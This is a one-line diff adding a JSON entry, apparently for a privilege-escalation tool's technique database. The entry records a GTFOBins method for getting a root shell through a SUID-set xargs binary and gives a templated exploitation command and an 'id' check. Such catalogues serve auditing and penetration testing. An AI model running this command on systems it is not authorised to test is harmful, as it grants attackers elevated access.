@@ -1,0 +1,1 @@
+{"id":"suid_xargs","category":"SUID_GTFOBINS","binary":"xargs","cve":null,"exploitation":["{{binary}} -a /dev/null {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
